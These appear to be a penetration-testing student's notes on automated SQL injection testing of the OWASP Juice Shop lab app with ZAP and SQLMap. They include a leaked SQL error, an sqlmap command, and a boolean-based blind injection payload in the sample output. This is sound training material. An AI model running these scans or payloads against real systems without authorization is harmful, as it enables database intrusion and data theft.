# Automated Attacks

### 1. Importance

Automating vulnerability scans helps speed up the testing process and catch common issues quickly. Manual testing should still be used for logic flaws and complex scenarios.

---
### 2. Configure ZAP Authentication

- **Set up authentication** early for effective navigation with valid credentials.
    
- Right-click your target site > Add to Context > Configure the context:
    
    - Change auth type from **Manual Authentication** to **JSON-based Authentication** (since Juice Shop uses JSON for login).
        
    - Provide the **Login URL** and set correct JSON keys:
        
        ```json
        {
          "email": "user@example.com",
          "password": "secret"
        }
        ```
        
- After configuring, ZAP will allow you to **run Spider as an authenticated user**.
    
---
### 3. Understanding the Backend vs Frontend

- Some search requests (like `/search?q=...`) may appear **only in proxy history**, not in the frontend.
    
- That indicates it’s a **backend endpoint**, not just JavaScript-rendered UI behavior — perfect for injection testing.

-  While paths after `#` is processed by the frontend, not the server. It will not appear in ZAP's history.

---
### 4. Create a SQLI Scan Policy

- Open ZAP settings with `Ctrl + P` → Add new policy → Name it `SQLI`.
    
- Set all categories to `OFF`:
    
    - `Apply OFF → Threshold to All Rules → Go`
        
- Go to **Injection > SQL Injection** → Set to `Medium` threshold and default strength.
    
---
### 5. Launch SQLI Scan

- Right-click the suspicious request (e.g., `/rest/products/search?q=test`)
    
- Start an **Active Scan** using your custom `SQLI` policy.
    
- Leave **Advanced Options** disabled if you don’t see your custom policy.
    
---
### 6. Detecting SQL Injection

- ZAP may return the response below with `500 Internal Server Error` from the backend — indicating unsanitized input in a SQL query:
    
```http
{  
  "error": {  
	"message": "SQLITE_ERROR: near \"'%'\": syntax error",  
	"stack": "Error: SQLITE_ERROR: near \"'%'\": syntax error",  
	"errno": 1,  
	"code": "SQLITE_ERROR",  
	"sql": "SELECT * FROM Products WHERE ((name LIKE '%test'%' OR description LIKE '%test'%') AND deletedAt IS NULL) ORDER BY name"  
  }  
}
```

---
### 7. Exploiting with SQLMap

- Save the request from ZAP to `.raw` file (e.g., `rest-search.raw`)
    
- Run SQLMap:
    
    ```bash
    sqlmap -r rest-search.raw --dbms sqlite --level 3
    ```
    
- If injection isn’t found at default level, increase `--level` and `--risk`.
	- But don't set the level from the first try

#### Example Output:

```plaintext
[CRITICAL] All tested parameters do not appear to be injectable
[WARNING] HTTP error 500 encountered
```

After increasing to `--level 3`, SQLMap identified the injection point.

#### Example Output:

```
GET parameter 'q' is vulnerable. Do you want to keep testing the others (if any)? [y/N]
sqlmap identified the following injection point(s) with a total of 145 HTTP(s) requests:
---
Parameter: q (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: q=') AND 2976=2976 AND ('HJXc' LIKE 'HJXc
---

```

---
### 8. Reporting

- Take screenshots of:
            
    - Detected SQL errors
        
    - SQLMap results
        

These will be valuable **evidence** for your final report.